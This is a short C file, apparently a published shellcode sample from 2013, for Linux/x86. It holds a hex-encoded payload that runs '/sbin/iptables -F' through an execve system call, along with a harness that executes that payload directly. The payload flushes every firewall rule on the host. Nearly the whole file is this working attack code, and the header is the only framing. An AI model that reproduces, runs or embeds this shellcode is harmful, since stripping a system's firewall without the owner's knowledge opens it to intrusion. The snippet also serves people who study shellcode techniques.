/*
 Filename  : iptables_flush_shellcode.c
 Author    : M.Acosta snow <amcx62[_at_]gmail[_dot_]com>
 Date      : 2013 August
 Location  : Lima(Peru)
 Desc	   : iptables flush 
 Tested on : Linux/x86 (Ubuntu SMP 3.2.0-49-generic-pae)
*/

#include<stdio.h>
#include<string.h>

unsigned char code [] =
"\x31\xc0\x50\x66\xc7\x44\x24\xfc\x2d\x46\x83\xec\x04\x89\xe6\x50\xc7\x44\x24\xfc\x62\x6c\x65\x73\xc7\x44\x24\xf8\x69\x70\x74\x61\xc7\x44\x24\xf4\x62\x69\x6e\x2f\xc7\x44\x24\xf0\x2f\x2f\x2f\x73\x83\xec\x10\x89\xe3\x50\x56\x53\x89\xe1\x89\xc2\x04\x0b\xcd\x80";
main()
{

        printf("Shellcode Length:  %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

}
